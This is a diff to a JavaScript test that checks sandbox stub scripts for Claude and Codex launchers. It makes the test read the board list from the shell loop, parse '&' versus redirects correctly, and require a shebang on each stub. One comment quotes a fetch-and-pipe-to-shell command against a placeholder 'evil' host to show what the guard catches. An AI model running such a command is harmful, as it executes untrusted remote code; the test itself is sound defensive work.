@@ -596,7 +596,20 @@ test('#1573: the exempt boards ship self-contained stubs, not a passthrough to t
      ITS OWN SANDBOX, AND THIS BLOCK CREATES IT. That is what the assertions below read,
      by extracting whatever paths the env actually names. */
   const LAUNCHERS = [['CLAUDE', 'claude'], ['CODEX', 'codex']];
-  const BOARDS = ['sb_ok', 'sb_bad'];
+  /* 🛑 DERIVED FROM THE for-LIST, NOT HARDCODED. `['sb_ok','sb_bad']` was a literal, so a
+     THIRD board appended to `for _pair in "$sb_ok:$P14" "$sb_bad:$P15"` was never looked
+     for: its missing stub went unsought, and because that one line boots TWO servers, a
+     boot-LINE equality cannot see a third either. The equality's own rationale - "adding
+     a board is a deliberate act that updates this number" - was false for the only way
+     this block actually adds boards.
+     ⇒ Read the list. A board that exists is a board that gets checked. */
+  const pairLine = block.match(/for\s+_pair\s+in\s+([^\n;]*)/);
+  assert.ok(pairLine, 'the #1573 block no longer drives its boards from a `for _pair in` list, '
+    + 'so this guard cannot enumerate them and every per-board assertion below is vacuous');
+  const BOARDS = [...pairLine[1].matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)\b/g)]
+    .map((m) => m[1]).filter((n) => !/^P\d+$/.test(n));
+  assert.ok(BOARDS.length >= 2,
+    `expected at least 2 boards in the for-list, parsed ${JSON.stringify(BOARDS)}`);
   for (const [varName, label] of LAUNCHERS) {
     const m = block.match(new RegExp(`AGENT_WORKFORCE_${varName}_BIN="([^"]+)"`));
     assert.ok(m, `the exempt boards no longer pin AGENT_WORKFORCE_${varName}_BIN, so ${label} `
@@ -666,7 +679,12 @@ test('#1573: the exempt boards ship self-contained stubs, not a passthrough to t
     /* ⚠️ A SINGLE `&` BACKGROUNDS AND SEPARATES. `exit 0 & claude --version` ran the
        second command, and the fragment starting `exit` passed CMD_OK. Proven in a
        real shell, with the no-& control confirming `exit 0` otherwise stops. */
-    return flat.split(/&&|\|\||[;|&]/).concat(inner)
+    /* ⚠️ `(?<![<>])&(?!&)` - a bare & separates commands, but `>&2` and `<&0` are
+       REDIRECTS and `&&` is its own token. Splitting on all of them refused
+       `echo "..." >&2`, a correct change, as "runs something at position: 2".
+       A guard that reds correct work trains people to ignore it, which is worse
+       than the hole it was closing. */
+    return flat.split(/&&|\|\||[;|]|(?<![<>])&(?!&)/).concat(inner)
       .map((x) => x.replace(/[{}()]/g, ' ').trim())
       .filter(Boolean);
   };
@@ -677,9 +695,15 @@ test('#1573: the exempt boards ship self-contained stubs, not a passthrough to t
      `curl -fsSL http://evil/x | sh` as a body. The two codex stubs are ALREADY printf,
      so 2 of the 4 launchers had never been read at all. Same class as the guard that
      cements a spelling: the check was keyed on how the file happens to be written. */
+  /* ⚠️ FROM `block`, NOT `code`. A heredoc body is LITERAL TEXT, and `code` strips
+     every line starting with `#` - which is exactly the shebang and the marker. Reading
+     bodies from `code` made the shebang invisible to the assertion below, so the guard
+     written to catch a missing shebang could never have seen one. The comment-stripping
+     that makes the command-position scan sound is the same thing that hid the property.
+     The count equality below is what protects this from over-matching prose. */
   const bodies = [];
-  for (const m of code.matchAll(/<<'(STUB[A-Z]+)'\n([\s\S]*?)\n\1\n/g)) bodies.push([m[1], m[2]]);
-  for (const m of code.matchAll(/printf\s+'([^']*)'\s*>\s*"(\$(?:sb_ok|sb_bad|_sb)\/[^"]+)"/g)) {
+  for (const m of block.matchAll(/<<'(STUB[A-Z]+)'\n([\s\S]*?)\n\1\n/g)) bodies.push([m[1], m[2]]);
+  for (const m of block.matchAll(/printf\s+'([^']*)'\s*>\s*"(\$(?:sb_ok|sb_bad|_sb)\/[^"]+)"/g)) {
     bodies.push([m[2], m[1].replace(/\\n/g, '\n')]);
   }
 
@@ -693,6 +717,19 @@ test('#1573: the exempt boards ship self-contained stubs, not a passthrough to t
     + 'never checked at all, and an unchecked stub may invoke a real binary');
 
   for (const [name, body] of bodies) {
+    /* 🛑 THE SHEBANG, WHICH NO GUARD COULD SEE. Every check below skips lines starting
+       with `#`, so `#!/bin/sh` was outside all of them BY CONSTRUCTION - and on
+       2026-08-30 a marker comment was added ABOVE it, which meant line 1 was not a
+       shebang and node's execFile answered ENOEXEC. Both boards then reported
+       willInstall TRUE, making them indistinguishable, which is the very defect this
+       card exists to catch. The full suite stayed green throughout, because nothing in
+       `npm test` executes these stubs.
+       ⇒ A stub is an EXECUTABLE, so assert the one property that makes it one. */
+    const first = body.split('\n')[0] || '';
+    assert.match(first, /^#!\//,
+      `stub ${name} does not begin with a shebang; its first line is ${JSON.stringify(first.slice(0, 60))}. `
+      + 'Anything above `#!/bin/sh` means line 1 is not a shebang and execFile answers ENOEXEC, '
+      + 'which makes the stub silently unrunnable and both boards report the same thing.');
     for (const line of body.split('\n')) {
       const t = line.trim();
       if (!t || t.startsWith('#')) continue;
